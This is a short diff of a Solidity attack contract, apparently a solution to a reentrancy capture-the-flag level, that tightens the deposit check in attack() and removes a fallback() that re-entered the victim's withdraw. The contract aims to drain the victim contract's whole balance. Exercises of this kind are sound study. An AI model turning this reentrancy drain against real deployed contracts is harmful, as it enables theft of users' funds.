@@ -12,7 +12,10 @@ contract ReentranceAttack {
     }
 
     function attack() external payable {
-        require(0 < msg.value, "Reentrance: Value must be gt 0");
+        require(
+            0 < msg.value && msg.value <= address(victimReentrance).balance,
+            "Reentrance: Wrong value"
+        );
 
         victimReentrance.donate{ value: msg.value }(address(this));
 
@@ -27,10 +30,6 @@ contract ReentranceAttack {
             0 == address(victimReentrance).balance,
             "Reentrance: Attack failed"
         );
-    }
-
-    fallback() external payable {
-        victimReentrance.withdraw(msg.value);
     }
 
     receive() external payable {
